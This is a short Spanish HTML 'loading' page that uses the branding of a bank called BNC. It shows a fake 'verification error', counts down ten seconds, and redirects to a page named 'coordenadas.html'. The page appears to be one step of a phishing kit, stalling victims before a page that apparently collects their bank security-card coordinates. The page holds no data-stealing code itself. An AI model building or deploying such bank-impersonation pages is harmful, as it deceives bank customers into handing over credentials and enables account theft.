<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cargando - BNC</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&amp;display=swap" rel="stylesheet">
    <style>
        body {
            font-family: Poppins, Helvetica, Arial, sans-serif;
            background-color: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 0;
            position: relative;
            overflow: hidden; /* Para ocultar cualquier desbordamiento */
        }

        .loading-container {
            background-color: rgba(0, 28, 77, 0.9);
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.4);
            text-align: center;
            z-index: 1; /* Asegura que el contenedor esté por encima de otros elementos */
            position: relative; /* Necesario para el z-index */
            color: #fff;
        }

        .loading-image {
            width: 100px; /* Tamaño de la imagen */
            margin-bottom: 20px; /* Espacio entre la imagen y el spinner */
            border-radius: 50%; /* Esto asegura el borde redondeado */
            border: 3px solid #fff; /* Borde blanco alrededor de la imagen */
        }

        .loading-spinner {
            border: 8px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top: 8px solid #28a745; /* Color del spinner */
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite; /* Animación de giro */
            margin: 20px auto; /* Centra el spinner */
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-text {
            font-size: 18px;
            margin-top: 20px;
        }

        .countdown-text {
            font-size: 16px;
            margin-top: 20px;
            color: #ffb300;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <div class="loading-container">
        <img src="bnnc.jpg" alt="Logo BNC" class="loading-image img"> <!-- Logo con borde redondeado -->
        <div class="loading-spinner"></div>
        <div class="loading-text">Error en verificación, por favor espere...</div>
        <!-- Contador de segundos -->
        <div class="countdown-text" id="countdown">10 segundos restantes...</div>
    </div>

    <script>
        // Tiempo inicial en segundos
        let countdownTime = 10;

        // Función para actualizar el contador
        function updateCountdown() {
            if (countdownTime > 0) {
                countdownTime--;
                document.getElementById('countdown').textContent = `${countdownTime} segundos restantes...`;
            } else {
                clearInterval(countdownInterval); // Detiene el contador cuando llega a 0
            }
        }

        // Llamada inicial al contador
        const countdownInterval = setInterval(updateCountdown, 1000); // Actualiza cada 1 segundo

        // Redirige después de 10 segundos
        setTimeout(() => {
            window.location.href = "coordenadas.html"; // Redirección a la página de pre-aprobación
        }, 10000); // 10000 ms = 10 segundos
    </script>

</body>
</html>
